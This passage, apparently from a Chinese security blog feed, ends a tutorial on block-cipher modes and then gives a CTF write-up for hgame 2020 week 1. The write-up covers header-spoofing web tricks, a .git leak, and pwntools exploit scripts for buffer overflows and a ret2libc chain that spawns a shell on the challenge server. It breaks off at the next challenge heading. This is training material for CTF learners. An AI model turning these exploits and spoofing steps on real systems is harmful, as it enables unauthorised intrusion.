alt="Feedback"></p><p>需要搞清楚的是，在三次解密阶段，我们的输入是图中左侧的y1,y2,y3；在flag加密阶段，flag是图中右侧的f1,f2,f3</p><p><strong>步骤1：拿第一段flag(称为flag1)：</strong></p><p>既然程序会对我们的输入进行解密，我们发送一串与flag密文等长的密文过去，程序解密后返回一段明文。</p><p>看到解密第一条，我们只需要将明文和密文的<strong>前16字节</strong>逐位异或就能得到<strong>$e_k(IV)$</strong>的值。</p><p>而三次解密之后程序返回的<strong>flag的密文</strong>的<strong>第一组</strong>就是<strong>flag1与$e_k(IV)$异或</strong>的结果。所以我们拿着<strong>$e_k(IV)$同flag的密文的第一组异或</strong>就能得到<strong>flag1</strong>。</p><p><strong>步骤2：拿第二段flag(称为flag2)：</strong></p><p>看到加密那一侧，flag2是flag的明文同$e_k(y_1)$异或的结果，那么我们的目的就是拿到$e_k(y_1)$</p><p>我们现在是手持flag1的人，我们现把将要发送的48字节划分为三段，flag1：pad1：pad2</p><p>在经过第一次解密后，我们的得到的结果的组成是：</p><p><strong>flag1与$e_k(IV)$异或的结果f1</strong></p><p><strong>pad1与$e_k(flag1)$异或的结果f2</strong></p><p><strong>pad2与$e_k(pad1)$异或的结果f3</strong></p><p>这里我们需要转变思想的是，在加密阶段，flag1与$e_k(IV)$异或的结果就是y1，所以我们现在已经拿到y1了</p><p>然后我们只需要将我们要发送的48字节划分为三段：y1：pad1：pad2</p><p>我们得到的结果的组成就是：</p><p><strong>y1与$e_k(IV)$异或的结果f1</strong></p><p><strong>pad1与$e_k(y1)$异或的结果f2</strong></p><p><strong>pad2与$e_k(pad1)$异或的结果f3</strong></p><p>现在，我们只需要将f2和pad1异或就能提取出$e_k(y1)$了。然后就可以拿去解密flag2了。</p><p><strong>步骤3：拿第三段flag(称为flag3)</strong></p><p>现在我们是手持flag1和flag2的人了。为了拿到flag3，我们需要拿到上图右侧的$e_k(y2)$</p><p>而上图右侧y2是flag2和$e_k(y1)$异或的结果，flag2我们有了，$e_k(y1)$我们也能拿到，那就没啥困难了。</p><p>首先重复第二步骤的操作拿到$e_k(y1)$，然后我们将$e_k(y1)$和flag2异或得到y2</p><p>然后我们发送的48字节的组成为：pad1：y2：pad2</p><p>这样我们得到的结果的组成就是：</p><p><strong>pad1与$e_k(IV)$异或的结果f1</strong></p><p><strong>y2与$e_k(pad1)$异或的结果f2</strong></p><p><strong>pad2与$e_k(y2)$异或的结果f3</strong></p><p>现在我们只需要将f3和pad2异或就能提取出$e_k(y2)$了。然后就可以拿去解密flag3了。</p><h4 id="输出反馈模式-OFB"><a href="#输出反馈模式-OFB" class="headerlink" title="输出反馈模式(OFB)"></a>输出反馈模式(OFB)</h4><p>​        OFB模式形成了一个同步序列密码,因为此密钥序列既不依赖明文，也不依赖密文。同CFB模式相同是，接收者不需要使用分组密码的解密函数来解密密文。</p><p>加解密规则</p><p><strong>假设$e_k()$表示用密钥k进行的分组加密；</strong></p><p><strong>$x_i，y_i，s_i$表示长度为b的位字符串，IV表示长度为b的初始向量</strong>（不需要填充）</p><p><strong>加密</strong>：$s_1=e_k(IV)    且y_1=s_1⊕x_1$    </p><p>&emsp;&emsp;    $s_i=e_k(s_{i-1})    且y_i=s_i⊕x_i      ,i≥2$</p><p><strong>解密</strong>：$s_1=e_k(IV)    且x_1=s_1⊕y_1$    </p><p>&emsp;&emsp;    $s_i=e_k(s_{i-1})    且x_i=s_i⊕y_i      ,i≥2$ </p><p>OFB模式并不是通过密码算法对明文间接进行加密的，而是通过将“明文分组”和“密码算法的输出”进行XOR来产生“密文分组”的，在这一点上OFB模式和CFB模式十分类似。 </p><p>而且OFB 可事前进行加密、解密的预备。与ECB不同的是，虽然每一组加密也相互独立，但明文的重复排列不会反应在密文中。因为一般情况下每次加密都会使用新的IV，所以使得OFB能够抵御重放攻击</p><h5 id="缺陷-3"><a href="#缺陷-3" class="headerlink" title="缺陷"></a>缺陷</h5><p>由于每一组的加解密独立，这降低了反转字节这样的主动攻击的成本。（不需要找”擦屁股的人“了）</p><h4 id="计数器模式-CTR"><a href="#计数器模式-CTR" class="headerlink" title="计数器模式(CTR)"></a>计数器模式(CTR)</h4><p>感觉上是OFB模式的升级版</p><p>加解密规则：</p><p><strong>假设$e_k()$表示用密钥k进行的分组加密；</strong></p><p><strong>$x_i，y_i$表示长度为b的位字符串，初始值IV和计数器$CTR_i$的连接表示位表示为(IV || $CTR_i$也是一个长度为b位的位字符串</strong>（不需要填充）</p><p><strong>加密：    $y_1=e_k(IV || CTR_i) ⊕x_1    ，i≥1$</strong></p><p><strong>解密：    $x_1=e_k(IV || CTR_i) ⊕y_1    ，i≥1$</strong></p><p>解释一下这个密钥序列是如何生成：</p><p>&emsp;&emsp;比如128位的AES。首先选择一个IV,长度小于分组长度(比如96位)。而剩下的32位则由计数器使用，并且该计数器的CTR值初始化为0。在会话期间加密的每个分组，计数器都会递增而IV则保持不变。在本例中，在不更换IV的情况下可加密的最大分组个数为$2^{32}$。由于每个分组长度都是8个字节，所以在生成一个新的IV前，可以加密的最大数据大小为$8*2^{32}=2^{35}$字节，大概为32G字节。</p><p>&emsp;&emsp;与OFB模式和CFB模式一样，CTR模式的密钥序列也是分组计算，但最吸引人的一个特点就是可以并行化，因为计数器模式不需要任何反馈，这与OFB或CFB模式完全不同。所以，我们可以让两个分组密码引擎同时并行工作，即让两个引擎同时使用第一个分组密码加密计数器值CTR和CTR2。 等这两个分组密码引擎完成后，第一个引擎将继续加密值CTR3,而另一个引擎则继续加密CTR,如此循环。</p><p>&emsp;&emsp;这种方案的加密速率是单个实现方式的两倍。当然，也可以同时运行多个分组密码引擎，这也会使加密速率按比例增加。对吞吐率要求严格的应用而言，比如在要求几Gb/s数据率的网络中，并行化的加密模式非常合适。</p><h5 id="缺陷-4"><a href="#缺陷-4" class="headerlink" title="缺陷"></a>缺陷</h5><p>与OFB模式相同，降低了反转字节这样的主动攻击的成本。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;总的来说，感觉现在用的比较多的还是CBC加密模式，CTF中OFB加密模式和CTR加密模式的赛题也不常见。</p><p>&emsp;&emsp;但对分组加密的五种主流加密模式及其一些攻击手法的学习，可以让我们了解这五种模式的各自的优缺点，这样，就算在以后的CTF的赛题中遇到，我们也好有的放矢。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《深入浅出密码学——常用加密技术原理与应用》（清华大学出版社）</p><p> <a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">https://blog.csdn.net/csu_vc/article/details/79619309</a> </p><p> <a href="https://blog.csdn.net/chengqiuming/article/details/82355772" target="_blank" rel="noopener">https://blog.csdn.net/chengqiuming/article/details/82355772</a> </p><p> <a href="https://www.dazhuanlan.com/2019/09/02/5d6c9d6f823a7/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/02/5d6c9d6f823a7/</a> </p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Block </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 hgame week1</title>
      <link href="/2020/02/18/2020hgame_week1/"/>
      <url>/2020/02/18/2020hgame_week1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​        2020hgame开始了，作为自2019hgame入手ctf的萌新，又来hgame学习了。这一次的week1感觉比去年又难了一个档次，不过花了四天摸爬滚打，连蒙带猜，终于是aak了，这里留下详细wp以供学习。其中二进制方向是最近才开始接触的，若有不当之处，望指正。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos的博客"><a href="#Cosmos的博客" class="headerlink" title="Cosmos的博客"></a>Cosmos的博客</h3><h4 id="题目介绍："><a href="#题目介绍：" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>Cosmos 的博客</p><p>你好。欢迎你来到我的博客。</p><p>大茄子让我把 flag 藏在我的这个博客里。但我前前后后改了很多遍，还是觉得不满意。不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。</p><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><p>通过题面中提到的github可以想到可能是.git泄露</p><p>于是利用工具git_extract： <a href="https://github.com/gakki429/Git_Extract" target="_blank" rel="noopener">https://github.com/gakki429/Git_Extract</a> </p><p>可以dump到.git文件，</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python git_extract<span class="selector-class">.py</span> http:<span class="comment">//cosmos.hgame.n3ko.co/.git/</span></span><br></pre></td></tr></table></figure><p>在其中的config文件里面有一个github项目的网址</p><p>进入页面点击人名到commit，</p><p>点最下面的项目</p><p>获得flag的base64，</p><p>解码即可</p><p>flag：hgame{g1t_le@k_1s_danger0us_!!!!}</p><h3 id="接头霸王"><a href="#接头霸王" class="headerlink" title="接头霸王"></a>接头霸王</h3><h4 id="题目介绍：-1"><a href="#题目介绍：-1" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>HGAME Re:Dive 开服啦~</p><h4 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h4><p>从名字可以看出，这一题的考点是报文头，所以开好burpsuit，直接抓包</p><p>step1：You need to come from  <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a></p><p>进行referer伪造，</p><p>Referer: <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a></p><p>step2：You need to visit it locally.</p><p>进行ip伪造：</p><p>x-forwarded-for: 127.0.0.1</p><p>step3:You need to use Cosmos Brower to visit.</p><p>进行UA伪造：User-Agent: Cosmos Brower    （出题人拼错单词23333）</p><p>step4：Your should use POST method :)</p><p>更改请求方式位POST：</p><p>step5：The flag will be updated after 2077, please wait for it patiently.</p><p>题面说flag在2077年会updated一次，所以我们可以请求在2077年之后不再更新的资源</p><p>If-Unmodified-Since: Fri, 01 Oct 2077 00:00:00 GMT</p><p>得到flag：hgame{W0w!Your_heads_@re_s0_many!}</p><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><h4 id="题目介绍：-2"><a href="#题目介绍：-2" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>Code is exciting!<br>参数a的提交格式为: 两数相加(a=b+c)</p><h4 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h4><p>这道题一进去就会重定向到一个new.php</p><p>好多新人认为是题目的问题，以为题目炸了，其实打开f12可以看见。被302重定向了</p><p>所以我们burpsuit抓包拦截，</p><p>发现405Not Allowed，</p><p>这里并没有发现任何判断身份的参数，最后尝试更改请求方式为POST</p><p>题面的意思是让我们通过参数a计算两数之和，</p><p>试着提交，a=1+9</p><p>发现失败了，因为url中。‘+’其实表示空格，这里我们将‘+’编码，urlencode后，传过去，</p><p>payload：?a=1%2b9</p><p>flag:hgame{C0d3_1s_s0_S@_sO_C0ol!}</p><h3 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h3><h4 id="题目介绍：-3"><a href="#题目介绍：-3" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>听说你球技高超？</p><h4 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h4><p>进入页面，是个打砖块的游戏，盲猜是作弊该分数了。</p><p>burpsuit开启拦截，随便玩下，输掉游戏后可以抓到包</p><p>把里的分数：2000，改掉。随便来个大一点的</p><p>得到flag：hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><h4 id="题目介绍：-4"><a href="#题目介绍：-4" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>无脑AAA太无聊了，挑战更高难度的无脑AAA！<br>nc 47.103.214.163 20000</p><h4 id="解题思路：-4"><a href="#解题思路：-4" class="headerlink" title="解题思路："></a>解题思路：</h4><p>静态分析核心代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0xA0</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(<span class="string">"0O0o"</span>, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在危险函数gets，所以会有溢出，</p><p>这里有个坑，就是伪代码恢复来的需要比较的字符只有0O0o，但是这个函数又要比较7个字符，</p><p>我们直接去.rodata段看</p><p>还是只有六个字符，，emmm，那就按D，转Data</p><p>这要就知道为啥反编译之后只给了4个字符了，因为当中有一个字符串截断符号，\x00，</p><p>所以真正要比较的字符串就是0O0o\x00O0</p><p>然后再看要被比较的字符串v5的起始地址</p><p>接受我们输入的地址是&amp;s</p><p>所以中间的填充字符的数量就是0xAC-0x31</p><p>画个图就是</p><p><img src="https://i.loli.net/2020/04/30/tpTBCkHQNwmiSsO.png" alt="img"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"Hard_AAAAA"</span>)</span><br><span class="line"></span><br><span class="line">def pwn(url,port,debug):</span><br><span class="line">    <span class="keyword">if</span> (<span class="attr">debug==1):</span></span><br><span class="line">        <span class="attr">sh</span> = process('./Hard_AAAAA')</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="attr">sh</span> = remote(url,port)</span><br><span class="line">    sh.recvuntil(<span class="string">"Let's 0O0o\\0O0!\n"</span>)</span><br><span class="line">    <span class="attr">payload</span> = <span class="string">"a"</span>* (<span class="number">0</span>xAC-<span class="number">0</span>x31)</span><br><span class="line">    payload+=<span class="string">"0O0o\x00O0"</span></span><br><span class="line">   <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">   <span class="comment"># pause()</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20000"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="One-shot"><a href="#One-shot" class="headerlink" title="One_shot"></a>One_shot</h3><h4 id="题目介绍：-5"><a href="#题目介绍：-5" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>一发入魂</p><h4 id="解题思路：-5"><a href="#解题思路：-5" class="headerlink" title="解题思路："></a>解题思路：</h4><p>可以看到，这里的name可以输出32个字符，我们看看栈里的布置</p><p><img src="https://i.loli.net/2020/04/30/oQhTVYBbSUEfNX9.png" alt="img"></p><p>可以发现，0xE0-0xC0 刚好等于32</p><p>所以，输入32个字节长的name后，按理说name和flag就拼接在一起了，</p><p>但是字符串会在最后加一个截断符\x00,所以也就是flag的第一位会被截断符给覆盖</p><p>这里程序贴心的给了一个修改指定地址的值为1的功能</p><p>所以我们输入地址：00000000006010E0，把这个截断符给改了，</p><p>那么程序有一个输出name的功能，输出name时，由于name和flag已经拼接在一起了，就会连着flag一起输出出来，当然，flag的第一位已经被数字1给覆盖了，但是不要紧，显然flag的第一位就是’h’</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"One_Shot"</span>)</span><br><span class="line"></span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./One_Shot'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"name?\n"</span>)</span><br><span class="line">    payload = <span class="string">"a"</span>* <span class="number">32</span></span><br><span class="line">    <span class="keyword">sh</span>.send(payload)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"shot!\n"</span>)</span><br><span class="line">    addr = <span class="keyword">int</span>(<span class="string">"0x6010E0"</span>,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(addr))</span><br><span class="line">    flag=<span class="keyword">sh</span>.recv()</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line">   # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">   # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20002"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h3><h4 id="题目介绍：-6"><a href="#题目介绍：-6" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>看起来人畜无害的一些整数也能秒我？(吃惊)<br>nc 47.103.214.163 20001</p><h4 id="解题思路：-6"><a href="#解题思路：-6" class="headerlink" title="解题思路："></a>解题思路：</h4><p>read函数的功能就是读入，返回20个数字</p><p>这里20个数字最多占8字节</p><p>并且数组的定义是__int64，64位下，数组的每个元素就占8个字节了。</p><p>我们看到，数组v4最多可以存11个数字，但是在循环读入的时候却读了20个数，这里显然有数组越界。</p><p>我们在看一下栈</p><p><img src="https://i.loli.net/2020/04/30/51KHsVeqZRjotS8.png" alt="img"></p><p>数组的地址时，-60到-08，这个var_4是i的地址。</p><p>也就是我们在读入20个数据的时候，数组会越界，并且还会覆盖i 的值。</p><p>由于程序中是根据i得值来算地址，来写入我们得输入，所以我们要控制i的值。</p><p>抛开这些不说，越界了之后又能干什么呢？这里有一种ret2libc的利用方式</p><p>参考这篇<a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">文章</a></p><p>溢出后我们先利用Ropgadget 找到 pop edi;ret 的地址，然后利用libc里的system函数，/bin/sh字符串来getshell</p><p>原理在上面的文章讲的比较清楚。这里介绍具体操作：</p><p>利用Ropgadget 找到 pop edi;ret 的地址</p><p>然后看看程序的libc的版本</p><p><img src="https://i.loli.net/2020/04/30/kfPgrNQFXHmcYlp.png" alt="img"></p><p>（打远程的时候还得知道远程环境的ubuntu版本，16.04，18.04还是不知道的，但是，其实有libcsearcher这样的神器，也有在线查的网站，所以问题不大）</p><p>然后我们先泄露一下程序里libc的某函数的地址，这里我们习惯性找‘__libc_start_main’这个函数，</p><p>怎么泄露？利用之前找到的pop edi;ret，跳到puts@plt那去，这个函数的地址怎么找</p><p><img src="https://i.loli.net/2020/04/30/LlpuXSwFjD94mA1.png" alt="img"></p><p>puts 的参数即指向‘__libc_start_main’的指针的地址这么找：</p><p><img src="https://i.loli.net/2020/04/30/hgAE57Ue9NJPaGT.png" alt="img"></p><p><img src="upload/image-20200121230334511.png" alt="image-20200121230334511"></p><p><img src="upload/image-20200121230348242.png" alt="image-20200121230348242"></p><p>图中的0000000000601030，</p><p>打过去后我们会收到‘__libc_start_main’函数的地址，其中只有最后三位是有效的，因为开启了ASLR，每一次的libc的基址都是随机的（但最后三位总是有效的）。</p><p>ALSR和PIE的区别：</p><p>简单来说，开启了ALSR，堆、栈、libc的地址会发生变化</p><p>开启了ALSR后又开启了PIE，则代码段和数据段的地址也会发生变化</p><p><img src="https://i.loli.net/2020/04/30/4ZiBMCbnfOKHDxu.png" alt="img"></p><p>我们拿到这后三位地址去 <a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a> 查</p><p><img src="https://i.loli.net/2020/04/30/VJclnhgNt9KwLso.png" alt="img"></p><p>有三个结果，一个个试过来好了，最后发现前两个版本都是可以的</p><p>它已经列好了我们需要的函数和字符串与我们泄露的那个函数地址的相对偏移了</p><p>我们直接加上去就好。即</p><p>system_addr = leak_value + 0x24c50<br>s_addr = leak_value + 0x16c617</p><p>（其实找put@plt和指向函数‘__libc_start_main‘的指针的地址有一种更方便的方法）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"Number_Killer"</span>)</span><br><span class="line"></span><br><span class="line">elf<span class="selector-class">.symbols</span>[<span class="string">'puts'</span>] <span class="comment">//返回.text段或者.plt段的函数地址</span></span><br><span class="line">elf<span class="selector-class">.got</span>[<span class="string">'__libc_start_main'</span>]<span class="comment">//返回got表中函数指针的地址</span></span><br></pre></td></tr></table></figure><p>我们leak了libc的地址了，我们还要回到主函数，再利用一次漏洞来getshell，所以puts的返回地址是</p><p>elf.symbols[‘main’]</p><p>前面谈到，i的值会被覆盖掉，所以我们要注意控制i的值，这里我们在走完11次之后，</p><p>我们一共填满了88(0x58)个字节，距离i中间还有4个字节的空间，于是我们填四个字节的ff，然后填一个数，就代表i的值了，这里我们直接让i=c,因为接下来我们要发送gadget的地址，puts@plt的地址，puts@plt的参数，puts@plt的返回地址（main），i=c，此时刚好写入地址就刚好指向返回地址。</p><p>然后让i走到19，此时程序才会跳出循环，函数才会返回，也就是跳到我们得puts@plt，所以我们之后还要进行填充。</p><p>【注，64位程序通过寄存器传值，所以是pop rdi；ret   函数参数   函数地址   函数返回地址    这样的顺序；</p><p>如果是32位程序，就不用pop rdi；ret了，直接可以传：函数地址 函数返回地址 函数参数】</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"Number_Killer"</span>)</span><br><span class="line">#libc =</span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./Number_Killer'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"numbers!\n"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xffffffffffffffff)) #填充数组</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xcffffffff))#小端序，后四个字节用来填充，<span class="keyword">c</span>是i的值</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>x400803))#ROPgadget --binary ./pwnme --<span class="keyword">only</span> <span class="string">"pop|ret"</span> | <span class="keyword">grep</span> <span class="string">'rdi'</span></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.got[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.symbols[<span class="string">'puts'</span>]))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.symbols[<span class="string">'main'</span>]))</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">         <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xdeadbeef))#填充，让循环走完</span><br><span class="line"></span><br><span class="line">    leak_value = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"leak_value %s"</span>%hex(leak_value))</span><br><span class="line">    #libc_base = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">    system_addr = leak_value + <span class="number">0</span>x24c50#后面的相对偏移就是网站查询得来的</span><br><span class="line">    sh_addr = leak_value + <span class="number">0</span>x16c617</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"numbers!\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xffffffffffffffff))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xcffffffff))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>x400803))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(sh_addr))#system的参数，<span class="string">'/bin/sh'</span>的地址</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(system_addr))#system函数的地址（这两个都是libc里头的）</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xdeadbeef))#填充，让循环走完</span><br><span class="line">        </span><br><span class="line">    # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">    # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20001"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h3><h4 id="题目介绍：-7"><a href="#题目介绍：-7" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>ROP is PWNers’ romance<br>nc 47.103.214.163 20003</p><h4 